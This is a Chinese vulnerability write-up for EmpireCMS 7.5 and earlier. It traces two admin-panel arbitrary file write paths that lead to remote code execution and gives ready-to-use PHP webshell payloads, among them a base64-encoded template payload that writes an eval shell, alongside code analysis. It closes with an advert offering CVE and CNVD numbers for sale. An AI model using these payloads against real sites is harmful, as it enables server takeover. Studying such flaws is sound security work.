<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/mw7o3go3oviybCMgqrsOkw)

![](https://mmbiz.qpic.cn/mmbiz_png/Iwic48fpkwA2ogDX4yMVb4YGtrsPzUTBzRzC1uvjd7MjTEl0mkPMKsXERWRRu9u987r6zE3YmibzrQDfeheHeXhA/640)

```
本篇内容非作者原创，收录于先知社区：https://xz.aliyun.com/t/6228#toc-6

```

一  

漏洞描述

《帝国网站管理系统》英文译为＂EmpireCMS＂，它是基于 B/S 结构，安全、稳定、强大、灵活的网站管理系统．

该系统后台存在设计缺陷，导致攻击者通过该漏洞可直接获取服务器权限。

二  

二

影响版本

EmpireCMS<=7.5

三  

三

漏洞复现  

### **任意文件写入 1**

这个漏洞挖掘最初来源于 qclover 师傅: EmpireCMS_V7.5 的一次审计

但是在这篇复现的文章中还是有一些出入的地方，比如说 getshell 的具体位置和成因。这里重新跟进分析一下

首先看一下 getshell 的流程，这个洞有点像黑盒 to 白盒

![](https://mmbiz.qpic.cn/mmbiz_png/Iwic48fpkwA3RVjSgSpd26tn3mI3yicHSlsedxnDzY0ia34CsLYg89BrBLLnBsKlce75jrKW83VWIgXgod5EqDzFw/640?wx_fmt=png)

**增加页面**功能，会在程序根目录生成一个 shell.php，访问为 phpinfo 结果

![](https://mmbiz.qpic.cn/mmbiz_png/Iwic48fpkwA3RVjSgSpd26tn3mI3yicHSlnkIg3xOKf1Ysbyygyw8zU8iapicUGjpg7pN0ORdZliaEzibDmEBtYRgHGA/640?wx_fmt=png)  

但是在我写入其他木马时，例如 <?php @eval($_REQUEST[hpdoger]);?>，根目录却生成了一个空的 shell.php 文件  

![](https://mmbiz.qpic.cn/mmbiz_png/Iwic48fpkwA3RVjSgSpd26tn3mI3yicHSl7fricUeguwribicHGcAewSbAY3NrgAPiaccyjw3JwwwTibSaqoBLoZHF0wg/640?wx_fmt=png)

此时就有些疑问，推测真正的漏洞点应该不是在根目录写入一个 php，应该另有它径，这里分析一下漏洞产生的真正成因。  

### **任意文件写入 2**

承接上一个漏洞，整个 empirecms 不少用到 ob_get_contents 的地方，所以就想挖掘一下还有没有其他可以利用的点，最后把眼光锁在增加模版处。

在后台模版功能处，选择管理首页模版，然后点击**增加首页方案**

![](https://mmbiz.qpic.cn/mmbiz_png/Iwic48fpkwA3RVjSgSpd26tn3mI3yicHSlsZCbVXTkK1ribUUqyibCl86CeujOnfgcWLSjX7YjCGKG3WKYSdczG0Yg/640?wx_fmt=png)

复制下面的 payload，填写到模版内容处，点击提交。  

```
<?php <br>$aa = base64_decode(ZWNobyAnPD9waHAgZXZhbCgkX1JFUVVFU1RbaHBdKTsnPnNoZWxsLnBocA);<br>${(system)($aa)};<br>?>

```

![](https://mmbiz.qpic.cn/mmbiz_png/Iwic48fpkwA3RVjSgSpd26tn3mI3yicHSlQ5ZjOibWbF1GG4vsxeucn4wDzL6jEko6sWxRO8ucib6JyT13ib58icFnRw/640?wx_fmt=png)

```
ZWNobyAnPD9waHAgZXZhbCgkX1JFUVVFU1RbaHBdKTsnPnNoZWxsLnBocA
=>
echo '<?php eval($_REQUEST[hp]);'>shell.php

```

再点击**启用此方案**即可 getshell，在 e/admin/template / 目录下生成 shell.php

![](https://mmbiz.qpic.cn/mmbiz_png/Iwic48fpkwA3RVjSgSpd26tn3mI3yicHSlnHvKxuiahhJUtLqNnKN25GuMexx4YFcAiaT1KFStqnsPyobbQ3kqsNhA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Iwic48fpkwA3RVjSgSpd26tn3mI3yicHSlLIbB81PRbZgbCfGXTcjRNUzIxGoRRibt5e5Wx7wxxBx5EEXOT20KaxA/640?wx_fmt=png)  

四  

漏洞分析  

### **任意文件写入 1**

入口在 e/admin/ecmscom.php 代码 48 行，跟进函数 AddUserpage

![](https://mmbiz.qpic.cn/mmbiz_png/Iwic48fpkwA3RVjSgSpd26tn3mI3yicHSlJCjdUynE2Km2MbX9NOM9S13QWyYE6ibs6zs0ASXqcGgnhKaWFYfLW6g/640?wx_fmt=png)

重点关注两个参数的流程: path、pagetext  

![](https://mmbiz.qpic.cn/mmbiz_png/Iwic48fpkwA3RVjSgSpd26tn3mI3yicHSlVC46nTLvB0hby4FQBVnVsSxEYIEibryr4K8FWJj5NjGvq4TSWicgIaeA/640?wx_fmt=png)  

步入 RepPhpAspJspcode 函数  

```
function RepPhpAspJspcode($string){
    global $public_r;
    if(!$public_r[candocode]){
        //$string=str_replace("<?xml","[!--ecms.xml--]",$string);
        $string=str_replace("<\\","<\\",$string);
        $string=str_replace("\\>","\\>",$string);
        $string=str_replace("<?","<?",$string);
        $string=str_replace("<%","<%",$string);
        if(@stristr($string,' language'))
        {
            $string=preg_replace(array('!<script!i','!</script>!i'),array('<script','</script>'),$string);
        }
        //$string=str_replace("[!--ecms.xml--]","<?xml",$string);
    }
    return $string;
}

```

这个函数用来对 pagetext 参数进行了 php 标签的实体化，但是 empirecms 默认 public_r[candocode] 为 null，所以这里相当于直接返回了原始 pagetext 的值

继续回到 AddUserpage 函数，接着步入 ReUserpage 函数，在 e/class/functions.php 的 4281 行  

![](https://mmbiz.qpic.cn/mmbiz_png/Iwic48fpkwA3RVjSgSpd26tn3mI3yicHSlib0Sf5aJuVR9RVAev4YDeI9VCKUMKwmXLXUEiaFonFaNvDJFuUt1ktow/640?wx_fmt=png)  

获取程序的根路径后拼接传入的 path，而后 DoFileMKDir 在根目录建立了 shell.php

接着步入 InfoNewsBq 函数，也是这个漏洞产生的函数。关键代码在 e/class/functions.php 的 2469-2496 行  

![](https://mmbiz.qpic.cn/mmbiz_png/Iwic48fpkwA3RVjSgSpd26tn3mI3yicHSlibUowY9q4tGfhoJlXvzkGiaBlic19mvY2AfMTiay0V9EzNtvY8n6FrPy4g/640?wx_fmt=png)  

$file 参数以 php 结尾，通过 WriteFiletext 函数向 $file 中写入上一步的 pagetext(这里为 $indextext)，而 WriteFiletext 是没有任何过滤的  

```
function WriteFiletext($filepath,$string){
    global $public_r;
    $string=stripSlashes($string);
    $fp=@fopen($filepath,"w");
    @fputs($fp,$string);
    @fclose($fp);
    if(empty($public_r[filechmod]))
    {
        @chmod($filepath,0777);
    }
}

```

于是在 e/data/tmp 目录下，以模版文件的形式写入 webshell，同时也将 AddCheckViewTempCode() 返回的权鉴方法写了进去，所以我们不能直接以 url 的方式访问这个 webshell。  

![](https://mmbiz.qpic.cn/mmbiz_png/Iwic48fpkwA3RVjSgSpd26tn3mI3yicHSlgHJxLCia4xGfxgM7evT94icIOPBmsQOTj4RZribrGptKsRwPAXoMs7jKw/640?wx_fmt=png)  

但是仍有方法使这个 webshell 执行并将结果输出。原因在下面这几行  

![](https://mmbiz.qpic.cn/mmbiz_png/Iwic48fpkwA3RVjSgSpd26tn3mI3yicHSlTlpyxrBnJLVM2m5QEUdWGwthXjEv3gUUREP43MlkUgciat4RQiciaeOTA/640?wx_fmt=png)  

由于入口处定义了常量 InEmpireCMS，ob_get_contents 可以读取缓冲区的输出，而输出正好是刚才我们包含进去的 shell 的结果。因此执行了 phpinfo() 后将要输出到浏览器的内容赋值给了 $string 变量并返回，在 ReUserpage 函数中又进行了一次写入，缓冲结果写入的根目录下的 shell.php，造成一个表面 getshell 的现象，其实是一种 rce。  

![](https://mmbiz.qpic.cn/mmbiz_png/Iwic48fpkwA3RVjSgSpd26tn3mI3yicHSlnrOraicD0OBI3p3oHH7qg4krcSd15cX5XdxWzblWJQkYA6gzr4mkicsw/640?wx_fmt=png)

### **任意文件写入 2**

在 e/class/functions.php 的 NewsBq 函数中调用 WriteFiletext 函数向 / e/data/tmp/index.php 中写入文件并包含

![](https://mmbiz.qpic.cn/mmbiz_png/Iwic48fpkwA3RVjSgSpd26tn3mI3yicHSlxccj1SHB5OHQwibYWmCQ0ic7Pty6eLoXzicR8HRwvNjWkXPWKQGr6kmRw/640?wx_fmt=png)

查找一下哪些地方调用`NewsBq`函数，最后锁定在`e/admin/template/ListIndexpage.php`的`DefIndexpage`中

![](https://mmbiz.qpic.cn/mmbiz_png/Iwic48fpkwA3RVjSgSpd26tn3mI3yicHSlPFDE3CIwDlGsy7reenyRgN58icBLv0iaY561Pibvv5qvNbBvMzoIrbEVA/640?wx_fmt=png)

首先从库里获取得到 $r[temptext] 作为参数传入 NewsBq，此时 $class 为 null。那么文件内容可控吗？查看一下入库的语句，看看存不存在任意写入，全局搜索 enewsindexpage

在同文件 ListIndexpage.php 的第 23 行到 47 行，调用 insert 语句向 enewsindexpage 中增加数据，关键代码如下  

```
function AddIndexpage($add,$userid,$username){
    global $empire,$dbtbpre;
    if(!$add[tempname]||!$add[temptext])
    {
        printerror("EmptyIndexpageName","history.go(-1)");
    }
    ...
    $add[tempname]=hRepPostStr($add[tempname],1);
    $add[temptext]=RepPhpAspJspcode($add[temptext]);
    $sql=$empire->query("insert into {$dbtbpre}enewsindexpage(tempname,temptext) values('".$add[tempname]."','".eaddslashes2($add[temptext])."');");
    ...
}

```

调用 AddIndexpage 的入口为：  

```
$enews=$_POST['enews'];
if(empty($enews))
{$enews=$_GET['enews'];}
if($enews=="AddIndexpage")
{
    AddIndexpage($_POST,$logininid,$loginin);
}

```

所以 $add 为 $_POST 获取的数组，经过一次 eaddslashes2 函数清洗后以 temptext 字段存入库，而 eaddslashes2 在内部调用的是 addslashes。猜想开发者最初可能只是为了防止 sql 注入，而没有进行其他类型过滤。但是我们执行任意命令是可以绕过 addslashes 的限制，取出来 temptext 字段来 rce。

只需要用到复杂变量：PHP 复杂变量绕过 addslashes() 直接拿 shell（https://www.jianshu.com/p/7c818ddc5731）

整理思路：入库 rce 语句 -> 取出库 -> 写文件 -> 包含 rce->getshell  

```
对于CNVD、CNNVD、CVE证书以及编号有需求的请查看我的咸鱼小店：
【闲鱼】https://m.tb.cn/h.UoeOto2?tk=ofaXdiesYRp CZ3457 「这是我的闲鱼号，快来看看吧～」
点击链接直接打开

```

五  

感谢关注